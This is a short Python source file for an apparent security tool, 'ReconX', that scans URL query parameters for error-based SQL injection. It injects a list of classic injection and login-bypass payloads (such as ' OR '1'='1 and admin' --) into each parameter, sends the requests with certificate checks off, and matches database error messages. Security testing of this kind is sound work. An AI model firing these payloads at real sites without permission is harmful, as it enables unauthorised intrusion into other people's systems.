#!/usr/bin/env python3
"""
ReconX - SQL Injection Detector
"""

import requests
import re
from typing import List, Dict
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

class SQLiDetector:
    
    ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"PostgreSQL.*ERROR",
        r"Warning.*pg_.*",
        r"valid PostgreSQL result",
        r"SQLite3::SQLException",
        r"SQLite/JDBCDriver",
        r"System.Data.SQLite.SQLiteException",
        r"ORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Microsoft SQL Native Client error",
        r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver",
    ]
    
    PAYLOADS = [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1'/*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
    ]
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.vulnerabilities = []
    
    def test_url(self, url: str) -> List[Dict]:
        """Test URL for SQL injection vulnerabilities"""
        print(f"\n[*] Testing {url} for SQL injection...")
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            print("[!] No parameters found in URL")
            return []
        
        vulns = []
        
        for param_name in params.keys():
            print(f"[*] Testing parameter: {param_name}")
            
            for payload in self.PAYLOADS:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                
                try:
                    response = requests.get(test_url, timeout=self.timeout, verify=False)
                    
                    for pattern in self.ERROR_PATTERNS:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vuln = {
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'type': 'Error-based SQLi',
                                'evidence': pattern,
                                'severity': 'HIGH'
                            }
                            vulns.append(vuln)
                            print(f"[!] VULNERABLE: {param_name} with payload: {payload}")
                            break
                    
                except Exception as e:
                    print(f"[!] Error testing {param_name}: {str(e)}")
                    continue
        
        return vulns
    
    def scan_urls(self, urls: List[str]) -> List[Dict]:
        """Scan multiple URLs for SQL injection"""
        all_vulns = []
        
        for url in urls:
            vulns = self.test_url(url)
            all_vulns.extend(vulns)
        
        return all_vulns
